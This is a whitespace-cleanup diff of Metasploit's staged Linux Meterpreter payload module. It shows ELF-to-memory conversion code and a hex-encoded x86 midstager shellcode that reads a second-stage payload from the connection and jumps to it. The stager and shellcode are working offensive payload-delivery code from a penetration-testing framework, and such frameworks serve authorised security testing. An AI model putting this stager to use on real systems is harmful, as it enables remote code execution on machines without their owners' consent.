@@ -22,7 +22,7 @@ module Metasploit3
 			'Name'          => 'Linux Meterpreter',
 			'Version'       => '$Revision$',
 			'Description'   => 'Staged meterpreter server',
-			'Author'        => ['PKS', 'egypt'], 
+			'Author'        => ['PKS', 'egypt'],
 			'Platform'      => 'linux',
 			'Arch'          => ARCH_X86,
 			'License'       => MSF_LICENSE,
@@ -46,8 +46,8 @@ module Metasploit3
 
 		elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
 
-		elf.program_header.each { |hdr| 
-			if(hdr.p_type == Rex::ElfParsey::ElfBase::PT_LOAD) 
+		elf.program_header.each { |hdr|
+			if(hdr.p_type == Rex::ElfParsey::ElfBase::PT_LOAD)
 				print_status("Found PT_LOAD")
 				fileidx = hdr.p_offset & (~4095)
 				memidx = (hdr.p_vaddr & (~4095)) - elf.base_addr
@@ -64,19 +64,19 @@ module Metasploit3
 		print_status("Converted ELF file to memory layout, #{payload.length} to #{used} bytes")
 		return mem[0, used]
 	end
-	
+
 	def handle_intermediate_stage(conn, payload)
 		# Does a mmap() / read() loop of a user specified length, then
 		# jumps to the entry point (the \x5a's)
 
-		midstager = 
-		"\x81\xc4\x54\xf2\xff\xff\x6a\x04\x5a\x89\xe1\x89\xfb\x6a\x03\x58" +
-		"\xcd\x80\x57\xb8\xc0\x00\x00\x00\xbb\x00\x00\x04\x90\x8b\x4c\x24" +
-		"\x04\x6a\x07\x5a\x6a\x32\x5e\x31\xff\x89\xfd\x4f\xcd\x80\x3d\x7f" +
-		"\xff\xff\xff\x72\x05\x31\xc0\x40\xcd\x80\x87\xd1\x87\xd9\x5b\x6a" +
-		"\x03\x58\xcd\x80\x3d\x7f\xff\xff\xff\x77\xea\x85\xc0\x74\xe6\x01" +
-		"\xc1\x29\xc2\x75\xea\x53\xb8\x5a\x5a\x5a\x5a\xff\xd0\xe9\xd3\xff" +
-		"\xff\xff"
+		midstager =
+			"\x81\xc4\x54\xf2\xff\xff\x6a\x04\x5a\x89\xe1\x89\xfb\x6a\x03\x58" +
+			"\xcd\x80\x57\xb8\xc0\x00\x00\x00\xbb\x00\x00\x04\x90\x8b\x4c\x24" +
+			"\x04\x6a\x07\x5a\x6a\x32\x5e\x31\xff\x89\xfd\x4f\xcd\x80\x3d\x7f" +
+			"\xff\xff\xff\x72\x05\x31\xc0\x40\xcd\x80\x87\xd1\x87\xd9\x5b\x6a" +
+			"\x03\x58\xcd\x80\x3d\x7f\xff\xff\xff\x77\xea\x85\xc0\x74\xe6\x01" +
+			"\xc1\x29\xc2\x75\xea\x53\xb8\x5a\x5a\x5a\x5a\xff\xd0\xe9\xd3\xff" +
+			"\xff\xff"
 
 		# Patch entry point in properly.
 		# Patch in base ?
@@ -86,7 +86,7 @@ module Metasploit3
 		conn.put(midstager)
 		Rex::ThreadSafe.sleep(3)
 
-		# Send length of payload 
+		# Send length of payload
 		conn.put([ payload.length ].pack('V'))
 		return true
 
